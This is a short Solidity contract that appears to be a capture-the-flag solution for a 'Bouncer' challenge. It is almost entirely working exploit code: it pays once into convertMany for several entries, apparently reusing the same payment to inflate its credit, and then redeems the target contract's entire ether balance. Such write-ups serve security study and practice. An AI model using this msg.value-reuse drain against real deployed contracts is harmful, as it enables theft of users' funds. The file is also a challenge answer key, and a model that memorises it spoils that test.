pragma solidity ^0.8.0;

import "./Setup.sol";

contract DappSolve {
    Bouncer b;

    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    receive() external payable {}

    constructor(Setup _setup) payable {
        b = _setup.bouncer();
        b.enter{value: 1 ether}(ETH, 100 ether);
    }

    function exploit() public {
        uint256[] memory ids = new uint256[](5);
        b.convertMany{value: 100 ether}(address(this), ids);
        b.redeem(ERC20Like(ETH), address(b).balance);
    }
}
